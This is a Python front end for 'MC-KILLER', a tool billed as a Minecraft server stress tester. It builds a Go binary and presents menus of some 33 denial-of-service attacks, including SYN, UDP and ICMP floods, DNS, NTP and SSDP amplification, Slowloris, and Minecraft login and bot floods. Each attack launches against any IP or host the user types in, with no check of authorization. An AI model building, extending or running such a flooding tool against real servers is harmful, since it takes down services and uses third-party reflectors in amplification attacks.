import os
import sys
import subprocess
import shutil

BASE = os.path.dirname(os.path.abspath(__file__))
MCK_DIR = os.path.join(BASE, "mck")
BIN = os.path.join(MCK_DIR, "mck")

CYAN, GRAY, WHITE, GREEN, RED, YELLOW, RESET = (
    "\033[1;36m", "\033[90m", "\033[97m", "\033[92m", "\033[91m", "\033[93m", "\033[0m"
)

BANNER = rf"""{CYAN}
███╗   ███╗ ██████╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
████╗ ████║██╔════╝    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
██╔████╔██║██║         █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
██║╚██╔╝██║██║         ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║╚██████╗    ██║  ██╗██║███████╗███████╗███████╗██║  ██║
╚═╝     ╚═╝ ╚═════╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}{WHITE}Minecraft Server Stress Testing Framework{RESET}
{GRAY}Author: L1ghtXr | Contributor: DevBrezz{RESET}
"""

CATEGORIES = {
    "1": ("NETWORK LAYER", [
        ("tcp", "TCP Connect Flood", "Connection table exhaustion"),
        ("syn", "SYN Flood", "Semi-open connection flood (ROOT)"),
        ("ack", "ACK Flood", "Raw ACK packet flood (ROOT)"),
        ("rst", "TCP Reset Abuse", "RST injection flood (ROOT)"),
        ("fin", "FIN Flood", "TCP FIN packet flood (ROOT)"),
        ("udp", "UDP Flood", "Bandwidth exhaustion"),
        ("icmp", "ICMP Flood", "Echo request flood (ROOT)"),
        ("dns", "DNS Amplification", "Reflected DNS flood (ROOT)"),
        ("ntp", "NTP Amplification", "Monlist abuse (ROOT)"),
        ("ssdp", "SSDP Amplification", "UPnP reflection (ROOT)"),
        ("gre", "GRE Flood", "GRE tunnel flood (ROOT)"),
    ]),
    "2": ("APPLICATION LAYER", [
        ("http", "HTTP Flood", "GET/POST request flood"),
        ("https", "TLS Handshake", "TLS handshake exhaustion"),
        ("websocket", "WebSocket Flood", "WS connection exhaustion"),
        ("proxy", "TCP Proxy Abuse", "Proxy connection flood"),
        ("slowloris", "Slowloris", "Slow header exhaustion"),
    ]),
    "3": ("MINECRAFT PROTOCOL", [
        ("mc-handshake", "MC Handshake", "Handshake packet flood"),
        ("mc-status", "MC Status Ping", "Server list query flood"),
        ("mc-login", "MC Login Queue", "Login queue exhaustion"),
        ("mc-bot", "MC Bot Spam", "Full bot connections"),
        ("mc-compression", "MC Compression", "Large packet exhaustion"),
        ("mc-chunk", "MC Chunk", "Chunk request spam"),
        ("mc-entity", "MC Entity", "Entity interaction spam"),
        ("mc-command", "MC Command", "Command processing abuse"),
        ("mc-plugin", "MC Plugin Probe", "Plugin vulnerability probe"),
    ]),
    "4": ("WORLD / RESOURCE", [
        ("entity-spam", "Entity Spam", "Entity spawn overload"),
        ("chunk-spam", "Chunk Spam", "Chunk generation flood"),
        ("redstone", "Redstone", "Tick exhaustion"),
        ("hopper", "Hopper", "Inventory processing load"),
        ("tnt", "TNT", "Explosion processing load"),
        ("world-save", "World Save", "Disk I/O exhaustion"),
        ("memory", "Memory", "RAM exhaustion"),
        ("cpu", "CPU", "CPU exhaustion"),
    ]),
}


def check_go():
    if not shutil.which("go"):
        print(f"{RED}[!] Go not installed. Termux: pkg install golang{RESET}")
        return False
    return True


def ensure_binary():
    if os.path.exists(BIN) and os.access(BIN, os.X_OK):
        return True
    if not os.path.exists(MCK_DIR):
        print(f"{RED}[!] Missing {MCK_DIR}{RESET}")
        return False
    print(f"{CYAN}[*] Building mck...{RESET}")
    r = subprocess.run(
        ["go", "build", "-ldflags=-s -w", "-o", BIN, "."],
        cwd=MCK_DIR, capture_output=True, text=True,
    )
    if r.returncode != 0:
        print(f"{RED}[!] Build failed:{RESET}")
        print(f"{GRAY}{r.stderr}{RESET}")
        return False
    print(f"{GREEN}[+] Built {BIN}{RESET}\n")
    return True


def render_main_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║ {WHITE}MC-KILLER — ATTACK CATEGORIES{RESET}                                {CYAN}║")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    for num, (name, items) in CATEGORIES.items():
        print(f"║ {GREEN}[{num}]{RESET} {name:<45} {GRAY}{len(items)} tools{RESET}  {CYAN}║")
    print(f"║ {GRAY}[D]{RESET} Doctor / Build binary{' ' * 32} {CYAN}║")
    print(f"║ {GRAY}[B]{RESET} Back to R3CON{' ' * 42} {CYAN}║")
    print(f"║ {GRAY}[Q]{RESET} Quit{' ' * 52} {CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")


def render_attack_menu(cat_key):
    name, items = CATEGORIES[cat_key]
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║ {WHITE}{name}{RESET}")
    print(f"╠══════════════════════════════════════════════════════════════╣")
    for i, (key, label, desc) in enumerate(items, 1):
        print(f"║ {GREEN}[{i:02d}]{RESET} {label:<20} {GRAY}{desc:<29}{RESET} {CYAN}║")
    print(f"║ {GRAY}[B]{RESET} Back{' ' * 51} {CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")


def run_attack(key):
    print()
    target = input(f"{WHITE}Target (IP/host): {RESET}").strip()
    if not target:
        return

    default_port = "25565" if key.startswith("mc") else ("80" if key in ("http", "websocket", "proxy", "slowloris") else ("443" if key == "https" else "53"))
    port_in = input(f"{WHITE}Port (default {default_port}): {RESET}").strip() or default_port
    if not port_in.isdigit():
        print(f"{RED}[!] invalid port{RESET}")
        input(f"{GRAY}Press Enter...{RESET}")
        return

    level = input(f"{WHITE}Level [L1/L2/L3] (default L2): {RESET}").strip().upper() or "L2"
    if level not in ("L1", "L2", "L3"):
        level = "L2"

    print(f"\n{CYAN}[*] Launching {key} -> {target}:{port_in} ({level}){RESET}\n")
    try:
        subprocess.run([BIN, key, "--target", target, "--port", port_in, "--level", level])
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted{RESET}")
    input(f"\n{GRAY}Press Enter to return...{RESET}")


def interactive():
    while True:
        render_main_menu()
        try:
            choice = input(f"\n{GREEN}root@mck:~#{RESET} ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        if choice in ("q", "exit"):
            break
        elif choice in ("b", "back"):
            return
        elif choice in ("d", "doctor"):
            print(f"\n{CYAN}[*] Doctor:{RESET}")
            print(f"    Go:      {'✓' if shutil.which('go') else '✗'}")
            print(f"    Binary:  {'✓' if os.path.exists(BIN) else '✗'}")
            print(f"    Root:    {'✓' if hasattr(os, 'geteuid') and os.geteuid() == 0 else '✗ (raw sockets need root)'}")
            ensure_binary()
            input(f"\n{GRAY}Press Enter...{RESET}")
        elif choice in CATEGORIES:
            while True:
                render_attack_menu(choice)
                sub = input(f"\n{GREEN}root@mck:{CATEGORIES[choice][0].lower().split()[0]}~#{RESET} ").strip().lower()
                if sub in ("b", "back", "q"):
                    break
                if sub.isdigit():
                    idx = int(sub) - 1
                    items = CATEGORIES[choice][1]
                    if 0 <= idx < len(items):
                        run_attack(items[idx][0])


def main():
    if not check_go():
        sys.exit(1)
    if not ensure_binary():
        sys.exit(1)

    if len(sys.argv) > 1:
        subprocess.run([BIN] + sys.argv[1:])
    else:
        interactive()


if __name__ == "__main__":
    main()
